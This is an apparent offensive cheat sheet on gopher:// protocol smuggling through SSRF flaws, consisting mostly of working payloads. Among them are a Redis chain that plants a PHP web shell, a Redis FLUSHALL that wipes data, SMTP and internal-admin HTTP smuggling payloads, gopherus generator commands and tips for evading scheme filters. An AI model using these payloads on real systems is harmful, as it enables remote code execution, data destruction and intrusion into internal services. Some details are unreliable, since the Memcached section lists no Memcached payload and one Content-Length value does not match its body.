# SSRF - Protocol Smuggling (Gopher)

## Gopher Protocol Overview
Gopher allows sending raw bytes to a TCP port, enabling SSRF to smuggle arbitrary protocol requests (Redis, Memcached, SMTP, HTTP with custom headers) through an SSRF vector that only supports GET-like fetches.

## Gopher URL Format
```
gopher://HOST:PORT/_PAYLOAD
```
The `_` indicates start of raw data. Payload must be URL-encoded.

## Redis Exploitation via Gopher
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

### Redis RCE via Webshell Write (module load not needed)
```
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0ax%0d%0a$26%0d%0a<?php system($_GET[c]);?>%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

Use gopherus tool to auto-generate:
```bash
gopherus --exploit redis
```

## Memcached Exploitation
```bash
gopherus --exploit mysql
gopherus --exploit fastcgi
gopherus --exploit smtp
```

## MySQL via Gopher (limited, needs specific conditions)
```bash
gopherus --exploit mysql
```

## SMTP Smuggling (send email via internal mail server)
```
gopher://127.0.0.1:25/_HELO attacker%0d%0aMAIL FROM:<a@a.com>%0d%0aRCPT TO:<victim@target.com>%0d%0aDATA%0d%0aSubject: test%0d%0a%0d%0aBody%0d%0a.%0d%0aQUIT
```

## HTTP Request Smuggling via Gopher (crafting raw HTTP with custom headers)
```
gopher://127.0.0.1:80/_POST%20/admin%20HTTP/1.1%0d%0aHost:%20internal.local%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2013%0d%0a%0d%0aadmin=true
```

## FastCGI RCE (PHP-FPM)
```bash
gopherus --exploit fastcgi
# Generates gopher:// payload to invoke arbitrary PHP execution
```

## Encoding Considerations
```
- CRLF must be URL-encoded as %0d%0a
- Some SSRF filters block gopher:// scheme - try case variation Gopher://
- Double URL-encoding sometimes needed if app decodes once before fetch
```

## Tools
```
gopherus          # Auto-generate gopher SSRF payloads for Redis/MySQL/FastCGI/SMTP
SSRFmap           # Automated SSRF exploitation framework
```

## Testing Checklist
```
1. Confirm SSRF allows arbitrary scheme (not just http/https)
2. Identify internal services (Redis 6379, Memcached 11211, MySQL 3306, SMTP 25)
3. Use gopherus to generate protocol-specific payload
4. URL-encode CRLF sequences correctly
5. Verify port is reachable from SSRF vantage point (not just localhost)
```
